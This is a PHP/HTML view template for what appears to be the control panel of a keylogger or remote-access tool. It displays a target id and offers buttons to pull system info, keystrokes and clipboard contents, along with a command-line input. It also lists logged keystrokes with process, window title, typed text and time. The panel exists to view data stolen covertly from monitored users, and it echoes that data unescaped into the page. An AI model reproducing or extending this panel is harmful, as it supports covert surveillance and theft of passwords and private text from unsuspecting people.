<style>
    #header {
        height: 50px;
        width: 100%;
        background-color: dimgray;
    }
    #mainTable {
        width:900px;
        top:0px;
        left:0px;
        margin: auto;
    }

    .getButton {
        font-size: 16pt;
        height:50px;
        text-align: center;
        cursor: pointer;
        margin:4px;
    }
    #divId{
        display: inline-block;
    }
    #answerBox {
        margin-left: 4px;
        position: relative;
        top:0;
        height:450px;
        overflow: scroll;
    }
    #consoleChar {
        display: inline-block;
        font-size: 45pt;
        height: 3px;
        width:9px;
        background-color: black;
        margin-left: 1px;
    }
    #comandLine {
        display: inline-block;
        height: 20px;
        width: 100%;
    }
    #headerList td{
        cursor: default;
    }
    .userList tr td {
        vertical-align: middle;
        line-height: 1;
        padding: 1px 8px;
        height: 35px;
        font-size: .9em;
        cursor: pointer;
    }

</style>


<div class="block-overflow">
    <table id='mainTable' >
        <tr>
            <td>
                <div id ='header'></div>
            </td>
        </tr>
        <tr>
            <td>
                <table border='1' width='100%'>
                    <tr>
                        <td colspan='2'>
                            <h2 align='center'>id: <div id='divId'><?php echo $data['data']['shaId'] ;?></div></h2>
                        </td>
                    </tr>
                    <tr>
                        <td >
                            <div class='getButton' title='get-data systeminfo'>get-data systeminfo</div>
                        </td>
                        <td rowspan='6' width='70%' id='answerTd'>
                            <div id='answerBox'></div>

                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton' title='get-data keyboard'>get-data keyboard</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'  title='get-data clipboard'>get-data clipboard</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'>get-data systeminfo</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'>get-data systeminfo</div>
                        </td>
                    </tr>
                    <tr>
                        <td>
                            <div class='getButton'>get-data systeminfo</div>
                        </td>
                    </tr>
                    <tr>
                        <td colspan='2'>
                            <div ><input autofocus id="comandLine"></div>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>

            </td>
        </tr>
    </table>
</div>
<table>
    <tr>
        <td>id</td>
        <td>userId</td>
        <td>process</td>
        <td>title</td>
        <td>text</td>
        <td>eventTime</td>
    </tr>
    <?php
    $keyboard = $data['keyboard'];
    foreach($keyboard as $key => $row )
    {
    echo "<tr>
        <td>".$key."</td>
        <td>".$row['userId']."</td>
        <td>".$row['process']."</td>
        <td>".$row['title']."</td>
        <td>".$row['text']."</td>
        <td>".$row['eventTime']."</td>
    </tr>";
    }
    ?>
</table>

<script src="/js/jquery.js"></script>
<script src="/js/userControl.js"></script>

